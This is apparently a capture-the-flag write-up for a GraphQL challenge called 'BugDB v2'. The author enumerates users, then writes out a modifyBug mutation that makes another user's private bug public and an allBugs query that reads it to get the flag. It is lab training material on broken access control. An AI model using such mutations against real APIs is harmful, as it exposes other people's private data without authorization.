BugDB v2

# BugDB v2
## Flags = 1





![1.png](../_resources/5deac93384344377900e346dc7da6c18.png)




## Flag 0


![2.png](../_resources/2824fd69c4a842a7b87691c2e01e22b4.png)







using the docs as a guide I made several queries.


![3a.png](../_resources/9dfef84a00fc4c0797d30b6ef24ab8ba.png)


![3.png](../_resources/73743b166fe6499c8abe6510facd61ee.png)



from this I noticed two users , *admin* and *victim*,
After further digging around I didn't find any other clues.
Going back to the root types I started exploring *mutations* , with some googling I came up with a mutation query.
```
mutation{
  modifyBug(id:2, private:false) {
    ok
    bug {
      id
      text
      private
      reporter{
        id
      }
      reporterId
    }
  }
}
```



![4.png](../_resources/66520393949f4121b3022415931ade4f.png)


I then used the query in allBugs
```
query{ 
allBugs {
      id
      text
      private
      reporter{
        id
        username
      }
      reporterId
    }
  }
  
```


![flag.png](../_resources/b25211d2ec124b74ab1a45862c1fd0bd.png)



This resulted in getting the flag








